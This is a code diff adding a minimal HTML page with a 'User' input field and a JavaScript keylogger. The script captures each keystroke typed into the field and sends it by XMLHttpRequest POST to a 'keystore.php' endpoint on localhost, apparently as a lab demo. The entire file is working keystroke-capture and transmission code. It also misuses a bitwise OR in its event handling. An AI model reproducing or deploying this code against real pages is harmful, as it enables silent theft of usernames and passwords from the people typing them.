@@ -1,0 +1,22 @@
+<html>
+User : <input type=text name=user id=user /> <br>
+
+<script>
+	document.onkeypress = function(event)
+	{
+		var event=event | window.event ;
+		var key=document.getElementById("user").value ;
+		key=key.slice(-1);
+		
+		if(key)
+		{
+			console.log(key);
+			var http = new XMLHttpRequest();
+			var param = encodeURI(key);
+			http.open("POST","http://localhost:8001/keystore.php",true);
+			http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+			http.send("key="+ param);
+		}
+	}	
+</script>
+</html>
